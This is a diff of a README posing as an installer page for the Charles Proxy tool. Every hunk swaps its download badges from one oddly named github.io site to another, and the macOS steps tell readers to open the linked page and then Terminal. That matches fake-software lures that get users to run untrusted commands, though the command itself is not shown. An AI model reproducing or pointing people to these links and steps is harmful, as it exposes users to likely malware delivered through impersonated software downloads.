@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Charles Proxy](https://img.shields.io/badge/⬇_Install_Charles+Proxy-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Charles Proxy](https://img.shields.io/badge/⬇_Install_Charles+Proxy-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -61,9 +61,9 @@ Charles Proxy is an HTTP proxy and monitor for Windows, macOS, and Linux that en
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Charles Proxy is an HTTP proxy and monitor for Windows, macOS, and Linux that en
 
 <div align="center">
 
-[![⬇ Install Charles Proxy](https://img.shields.io/badge/⬇_Install_Charles+Proxy-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Charles Proxy](https://img.shields.io/badge/⬇_Install_Charles+Proxy-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Charles Proxy is an HTTP proxy and monitor for Windows, macOS, and Linux that en
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -125,7 +125,7 @@ Charles Proxy is an HTTP proxy and monitor for Windows, macOS, and Linux that en
 
 <div align="center">
 
-[![⬇ Install Charles Proxy](https://img.shields.io/badge/⬇_Install_Charles+Proxy-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Charles Proxy](https://img.shields.io/badge/⬇_Install_Charles+Proxy-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
